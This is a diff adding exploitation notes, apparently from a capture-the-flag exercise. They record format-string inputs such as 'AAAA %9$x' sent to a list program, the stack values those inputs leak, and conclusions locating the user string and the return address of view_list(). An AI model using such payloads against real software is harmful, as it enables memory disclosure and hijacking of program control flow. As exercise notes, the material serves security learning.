@@ -1,0 +1,27 @@
+> c
+Enter the name of the list: lol
+AAAA %9$x %10$x %11$x %12$x %13$x %14$x
+
+> s
+lol
+> v
+Enter the name of the list: lol
+AAAA ffedec88 2 41414141 24392520 31252078 20782430
+>
+
+CONCLUSION: arg 11 is the start of the string
+
+
+
+> a
+Enter the name of the list: lol
+%30$x %31$x %32$x %33$x %34$x
+
+> v
+Enter the name of the list: lol
+0 0 ffb90598 804889a ffb905b8
+8049130 f776ac20 1e494f00 0 0
+ffb905c8 8048fa0 ffb905b8 3 f776ac20
+>
+
+CONCLUSION: arg 31 is the retaddr from view_list()
